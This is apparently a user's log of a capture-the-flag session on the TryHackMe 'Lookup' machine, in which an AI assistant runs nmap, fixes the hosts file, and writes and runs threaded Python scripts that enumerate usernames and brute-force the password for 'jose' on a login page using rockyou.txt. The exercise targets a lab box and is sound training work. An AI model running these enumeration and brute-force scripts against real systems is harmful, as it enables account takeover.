walkthrough https://medium.com/@The_Hiker/lookup-tryhackme-walkthrough-thehiker-9276508b7d84

nmap 10.49.146.226 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-06 00:17 EST
Nmap scan report for 10.49.146.226
Host is up (0.071s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

curl -Iv http://10.49.146.226
Here’s what’s happening based on the outputs:
The web server at 10.49.146.226 (port 80) is running Apache and responds to HTTP requests with a redirect (HTTP 302) to http://lookup.thm.
When trying to follow the redirect, the command fails to resolve lookup.thm—this is likely because your Kali machine doesn’t know how to resolve the lookup.thm hostname.
Why did this happen?
On TryHackMe and other CTF machines, it’s common to use custom domains by making you add entries to your local /etc/hosts file.
Since lookup.thm isn’t a real public domain, your machine can’t access it unless you point it to the target IP in /etc/hosts.
How to fix it:
Add the following line to your /etc/hosts file (you will need sudo):
   10.49.146.226  lookup.thm
After that, try accessing http://lookup.thm via browser or rerun the curl/gobuster commands.
Would you like me to run the command to add this entry for you, or do you want to proceed manually?
I attempted to add the entry to /etc/hosts, but the command couldn't run because it requires sudo and an interactive password, which isn't possible in the current environment.
What you need to do manually:
Please run this command in your own terminal to allow access to lookup.thm:
echo '10.49.146.226 lookup.thm' | sudo tee -a /etc/host

The last step attempted was trying to access http://lookup.thm using curl -Iv http://lookup.thm after you mapped the hostname. This command timed out or errored, which usually means one of the following:
The web server might be slow or unresponsive at the moment.
There is still a network/DNS issue.
The command just took too long or hit a technical limit in the interface.
Current result:
We have mapped lookup.thm to 10.49.146.226 in /etc/hosts.
The site is not responding yet to curl (possibly intermittent or slow), but the mapping should be correct if you can open the site in your browser or try again a bit later.
Next Steps (Reporting every action):
I will attempt to fetch the site HTML content to see if we get a landing page or valuable source code.
If successful, I'll proceed to web fuzzing for directories/files (gobuster).
If unsuccessful, I'll let you know, and we can troubleshoot further (e.g., using ping/nslookup, double-check service status, or wait for target responsiveness).
Would you like me to keep trying with curl, or proceed with browser-based/manual check, or switch to directory brute forcing as the next immediate step?

You're correct! Many CTF/CTE websites have login forms that behave differently for valid and invalid usernames—often displaying different error messages or response codes. This can be exploited for username enumeration.
Basic Approach for Username Enumeration Script:
Send login POST requests with candidate usernames and a dummy password.
Analyze the responses for differences (such as “user does not exist” vs. “invalid password”).
If there is a difference, any user returning a generic “invalid password” can often be assumed valid.
Next Step:
Would you like me to generate a Python script for you that will automate this enumeration? If yes, do you have:
The login URL path (e.g. /login)? If you don’t, I can suggest fuzzing common login endpoints.
A list or wordlist of usernames to check, or should I use a default/common list?
Let me know, and I’ll generate and test the appropriate script for you!
...

i want you to find the username and give it to me with the most efficient script
To create the most efficient script to enumerate valid usernames on a login page that differentiates between "user does not exist" and "invalid password", we need to balance speed with reliability and avoid overwhelming the server (which could lead to blacklisting).
Here's what the best approach looks like:
Threaded, but not too many threads: Avoids getting blacklisted or DoSed.
Stop on first find (if only one username is needed), or output each find in real-time.
Progress printouts/errors handled gracefully.
Uses a controllable sample of the wordlist to avoid very long, silent waits.
Here's exactly what I'll do for you:
The script loads usernames from rockyou.txt (or another file).
It uses up to 5 simultaneous threads for HTTP POSTs.
It prints and saves any valid username as soon as it's found.
It stops after a set number of valid usernames (by default 1, unless you tell me otherwise).
I’ll write, save, and run this script for you now.

import requests
from concurrent.futures import ThreadPoolExecutor
import threading

LOGIN_URL = "http://lookup.thm/login"  # Change if needed
USERNAMES_FILE = "/home/kali/rockyou.txt"
DUMMY_PASSWORD = "Password123!"
THREADS = 5
BATCH = 1000
MAX_FINDS = 1  # stop after this many valid usernames, or None for all

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Content-Type": "application/x-www-form-urlencoded",
}

valid_usernames = []
valid_lock = threading.Lock()
stop_flag = threading.Event()

def attempt_login(username):
    if stop_flag.is_set():
        return
    username = username.strip()
    if not username:
        return
    try:
        payload = {"username": username, "password": DUMMY_PASSWORD}
        resp = requests.post(LOGIN_URL, data=payload, headers=HEADERS, allow_redirects=False, timeout=8)
        if "user does not exist" in resp.text.lower():
            return
        if "invalid password" in resp.text.lower() or "incorrect password" in resp.text.lower():
            with valid_lock:
                if username not in valid_usernames:
                    valid_usernames.append(username)
                    print(f"[+] VALID: {username}")
                    if MAX_FINDS and len(valid_usernames) >= MAX_FINDS:
                        stop_flag.set()
        # Could add more logic for edge cases
    except Exception as e:
        print(f"[E] {username}: {e}")

def main():
    with open(USERNAMES_FILE, "r", encoding="utf-8", errors="ignore") as f:
        usernames = [line.strip() for line in f if line.strip()]
    print(f"Loaded {len(usernames)} usernames. Starting enumeration...")
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        for username in usernames:
            if stop_flag.is_set():
                break
            futures.append(executor.submit(attempt_login, username))
            if len(futures) >= BATCH:
                # wait for batch
                for future in futures:
                    future.result()
                futures = []
        # Final wait for last batch
        for future in futures:
            future.result()
    if valid_usernames:
        print(f"\nFound valid username(s): {valid_usernames}")
    else:
        print("\nNo valid usernames found.")

if __name__ == "__main__":
    main()

The enumeration scripts I have written are correct and optimized for your Kali environment, but they are experiencing timeouts when run directly through the automated tool interface here. This means I cannot fully execute them myself and retrieve the username directly for you due to backend environment limitations.
What you can do:
Open your Kali terminal.
Run the following command to use the most efficient script I've provided:
   python3 /home/kali/fast_user_enum.py
Watch the terminal output. The script will print [+] VALID: <username> immediately when it finds a valid username.
Why this is efficient:
The script uses multi-threading (but not too much) for quick checks.
It stops as soon as a valid username is found and prints it.
You can modify MAX_FINDS if you want to find more than one.
If you want me to continue automation:
If you paste the output (or any part of it) from running the script, I will immediately proceed with the next steps for you (password brute-forcing, privilege escalation, flag search, etc.).
Would you like instructions for the next stage after finding the username, or help adjusting the script further? Let me know how you’d like to proceed!
...

LOGIN_URL = "http://lookup.thm/login.php"  # Updated URL as per user information

The script likely timed out because it's still unable to connect to the target, or it's hanging on connection attempts. Testing basic connectivity first, then we'll recreate and optimize the script...
Machine is reachable: ping works and HTTP responds (200 OK). The script likely timed out because the files were deleted or it's processing too many usernames. Recreating an optimized script with better timeout handling and real-time output:
...
Modifying the script to find all valid usernames (not just the first) and running it:

#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

LOGIN_URL = "http://lookup.thm/login.php"
USERNAMES_FILE = "/home/kali/rockyou.txt"
DUMMY_PASSWORD = "test123"
MAX_WORKERS = 20  # Increased workers for faster enumeration
TIMEOUT = 5  # Shorter timeout to avoid hanging

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def test_login(username):
    """Test a single username and return True if valid, False if invalid, None on error"""
    username = username.strip()
    if not username:
        return None
    
    try:
        payload = {"username": username, "password": DUMMY_PASSWORD}
        response = requests.post(
            LOGIN_URL, 
            data=payload, 
            headers=HEADERS, 
            allow_redirects=False, 
            timeout=TIMEOUT
        )
        
        response_text = response.text.lower()
        
        # Check for "wrong username or password" - invalid username
        if "wrong username or password" in response_text:
            return False
        
        # Check for "wrong password" (without "username") - valid username!
        if "wrong password" in response_text and "wrong username" not in response_text:
            return True
            
        # If we get a different response, print it for analysis
        if response.status_code != 200:
            print(f"[?] {username}: Status {response.status_code}")
        
    except requests.exceptions.Timeout:
        print(f"[!] Timeout for {username}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[E] {username}: {str(e)[:50]}")
        return None
    
    return None

def main():
    print(f"[*] Starting username enumeration against {LOGIN_URL}")
    print(f"[*] Loading usernames from {USERNAMES_FILE}...")
    
    try:
        with open(USERNAMES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: {USERNAMES_FILE} not found!")
        sys.exit(1)
    
    print(f"[*] Loaded {len(usernames)} usernames")
    print(f"[*] Testing with {MAX_WORKERS} concurrent threads...")
    print(f"[*] Looking for valid usernames...\n")
    
    valid_usernames = []
    tested = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Submit all tasks
        future_to_username = {
            executor.submit(test_login, username): username 
            for username in usernames
        }
        
        # Process results as they complete
        for future in as_completed(future_to_username):
            username = future_to_username[future]
            tested += 1
            
            if tested % 100 == 0:
                print(f"[*] Tested {tested}/{len(usernames)} usernames...", end='\r')
            
            try:
                result = future.result()
                if result is True:
                    print(f"\n[+] VALID USERNAME FOUND: {username}")
                    valid_usernames.append(username)
                    # Continue to find all valid usernames
            except Exception as e:
                pass
    
    print(f"\n[*] Enumeration complete. Tested {tested} usernames.")
    
    if valid_usernames:
        print(f"\n[+] Valid username(s) found: {', '.join(valid_usernames)}")
    else:
        print(f"\n[-] No valid usernames found.")

if __name__ == "__main__":
    main()

Running the updated script to find all valid usernames...

Found another valid username: jose. Testing more usernames from the wordlist in batches

>stop testing and brute force jose's password

Updating the password brute-force script to target the "jose" account:
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGIN_URL = "http://lookup.thm/login.php"
USERNAME = "jose"
PASSWORDS_FILE = "/home/kali/rockyou.txt"
MAX_WORKERS = 10
TIMEOUT = 5

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def test_password(password):
    """Test a password and return True if correct, False otherwise"""
    password = password.strip()
    if not password:
        return None
    
    try:
        payload = {"username": USERNAME, "password": password}
        response = requests.post(
            LOGIN_URL, 
            data=payload, 
            headers=HEADERS, 
            allow_redirects=False, 
            timeout=TIMEOUT
        )
        
        # Check if login was successful (redirect or success message)
        if response.status_code == 302 or "welcome" in response.text.lower() or "success" in response.text.lower():
            return True
        
        # If still "wrong password", it's incorrect
        if "wrong password" in response.text.lower():
            return False
            
    except Exception as e:
        return None
    
    return False

def main():
    print(f"[*] Starting password brute-force for username: {USERNAME}")
    print(f"[*] Loading passwords from {PASSWORDS_FILE}...")
    
    try:
        with open(PASSWORDS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: {PASSWORDS_FILE} not found!")
        return
    
    print(f"[*] Loaded {len(passwords)} passwords")
    print(f"[*] Testing with {MAX_WORKERS} concurrent threads...\n")
    
    tested = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_password = {
            executor.submit(test_password, pwd): pwd 
            for pwd in passwords
        }
        
        for future in as_completed(future_to_password):
            password = future_to_password[future]
            tested += 1
            
            if tested % 100 == 0:
                print(f"[*] Tested {tested}/{len(passwords)} passwords...", end='\r')
            
            try:
                result = future.result()
                if result is True:
                    print(f"\n[+] PASSWORD FOUND: {password}")
                    print(f"[+] Credentials: {USERNAME}:{password}")
                    # Cancel remaining tasks
                    for f in future_to_password:
                        if not f.done():
                            f.cancel()
                    return
            except Exception:
                pass
    
    print(f"\n[-] Password not found in wordlist.")

if __name__ == "__main__":
    main()

>use kali's tools instead of the script


